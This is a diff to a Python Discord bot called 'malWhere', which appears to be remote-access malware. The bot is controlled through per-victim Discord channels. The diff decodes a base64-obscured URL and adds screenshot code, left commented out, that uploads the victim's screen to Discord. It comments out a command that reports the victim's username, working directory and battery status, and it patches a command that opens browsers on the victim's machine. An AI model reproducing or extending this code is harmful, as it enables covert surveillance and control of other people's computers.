@@ -5,11 +5,12 @@ import discord
 from discord.ext import commands
 import json
 import base64
-#import pyautogui
+import pyautogui
 import getpass
 import psutil
+import PIL
 
-encryptedapi="<base64 encoded api key>"
+encryptedapi="aHR0cHM6Ly9nb2RzZXllLmZyZWUuYmVlY2VwdG9yLmNvbS8="
 base64_string =encryptedapi
 base64_bytes = base64_string.encode("ascii")
 sample_string_bytes = base64.b64decode(base64_bytes)
@@ -79,42 +80,47 @@ async def geolocate(ctx):
     await ctx.channel.send("wrong channel skid")
 
 
-#out of order due to replit having issues with xauth and ./xauthority files#
+#commented out due to not working on relpit but working on Windows
 # @malWhere.command()
 # async def screenshot(ctx):
-#    existing_channel = discord.utils.get(guild.channels, name=ip4chan)
-#    if not existing_channel:
-#      await guild.create_text_channel(f"{ip} media")
-#      myScreenshot = pyautogui.screenshot()
-#      myScreenshot.save(r'tempimage.png')
-#      channel = discord.utils.get(ctx.guild.channels, name=f"{ip} media")
-#      channel_id = channel.id
-#      mediachan=malWhere.get_channel(channel_id)
-#      mediachan.send(image="tempimage.png")
+#     guild = malWhere.get_guild(874824520467349504)
+#     existing_channel = discord.utils.get(guild.channels, name=(f"{ip4chan}-media"))
+#     channel_id = existing_channel.id
+#     if not existing_channel:
+#       await guild.create_text_channel(f"{ip4chan}-media")
+#     myScreenshot = pyautogui.screenshot()
+#     myScreenshot.save(r'tempimage.png')
+#     with open('tempimage.png', 'rb') as f:
+#       picture = discord.File(f)
+#       mediachan=malWhere.get_channel(channel_id)
+#       await mediachan.send(file=picture)
+
+# @malWhere.command()
+# async def pcinfo(ctx):
+#   if str(ctx.channel)==(ip4chan):
+#     battery = psutil.sensors_battery()
+#     plugged = battery.power_plugged
+#     percent = str(battery.percent)
+#     plugged = "Plugged In" if plugged else "Not Plugged In"
+#     embed=discord.Embed(title="PC Info", url="", description=f"{ip}'s PC data", color=0xFF5733)
+#     embed.add_field(name="Username", value=getpass.getuser(), inline=False)
+#     embed.add_field(name="Current Working Directory", value=os.getcwd(), inline=False)
+#     embed.add_field(name="battery status", value=f"Battery Percentage is {percent}%")
+#     embed.add_field(name="Plugged In",value=f" Battery is {plugged}")
+#     await ctx.send(embed=embed)
+#     await ctx.message.delete()
+#   else:
+#     await ctx.channel.send("wrong channel skid")
 #############################################################################
-
 @malWhere.command()
-async def pcinfo(ctx):
-  if str(ctx.channel)==(ip4chan):
-    battery = psutil.sensors_battery()
-    plugged = battery.power_plugged
-    percent = str(battery.percent)
-    plugged = "Plugged In" if plugged else "Not Plugged In"
-    embed=discord.Embed(title="PCData", url="", description=f"{ip}'s PC data", color=0xFF5733)
-    embed.add_field(name="Username", value=getpass.getuser(), inline=False)
-    embed.add_field(name="Current Working Directory", value=os.getcwd(), inline=False)
-    embed.add_field(name="battery status", value=f"Battery Percentage is {percent}% Battery Plugged in =  {plugged}")
-    await ctx.send(embed=embed)
-    await ctx.message.delete()
-  await ctx.channel.send("wrong channel skid")
-
-@malWhere.command():
 async def rickroll(ctx):
   try:
     os.popen("chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ")
     os.popen("firefox https://www.youtube.com/watch?v=dQw4w9WgXcQ")
     os.popen("opera https://www.youtube.com/watch?v=dQw4w9WgXcQ")
     os.popen("brave https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+  except:
+    pass
   ctx.message.delete()
 
 malWhere.run(TOKEN)
